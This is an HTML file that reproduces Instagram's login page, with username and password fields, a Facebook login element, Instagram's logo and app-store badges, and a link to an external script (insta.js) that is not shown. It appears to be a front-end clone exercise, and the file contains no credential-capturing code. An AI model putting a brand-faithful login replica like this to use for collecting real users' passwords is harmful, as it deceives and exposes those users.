<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram login page</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <div class="main">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
        <form id="loginform">
            <input type="text" id="username" placeholder="Username or Email">
            <input type="password" id="password" placeholder="Password"><br>
            <input type="submit" id="submit" value="Log in" >
            <div class="mid">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="facebook">
                <i class="fa fa-facebook-f" style="color: #042c70;"></i>
                <p>Login with Facebook</p>
            </div>
            <div class="pass">
                <p>Forgot password ?</p>
            </div>
        </form>
    </div> 
    <div class="main">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="last">
        <p>Get the App</p>
        <div class="app">
            <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                <img class="image1"  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                <img class="image2" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
              </a>
        </div>
    </div>
    <script src="insta.js"></script>
</body>
</html>
